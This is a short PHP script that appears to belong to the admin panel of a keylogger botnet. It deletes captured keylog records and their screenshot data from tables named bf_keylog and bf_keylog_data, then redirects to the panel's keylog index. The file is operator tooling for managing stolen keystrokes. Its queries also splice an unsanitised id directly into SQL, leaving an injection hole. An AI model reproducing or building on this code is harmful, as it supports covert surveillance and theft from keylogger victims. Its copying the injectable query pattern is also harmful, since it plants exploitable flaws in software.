<?php

if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');

	if($item->id == $Cur['id']){		/*
		$files = $mysqli->query('SELECT screen FROM bf_keylog_data WHERE (hash = \''.$item->hash.'\')', null, null, false);

		if(count($files) > 0){
			foreach($files as $file){
				@unlink('logs/keylogs/' . $file->screen);
			}
		}
        */
		$mysqli->query('DELETE FROM bf_keylog WHERE (id = \''.$item->id.'\') LIMIT 1');
		$mysqli->query('DELETE FROM bf_keylog_data WHERE (hash = \''.$item->hash.'\')');
	}
}

header('Location: /keylog/index.html');
exit;

?>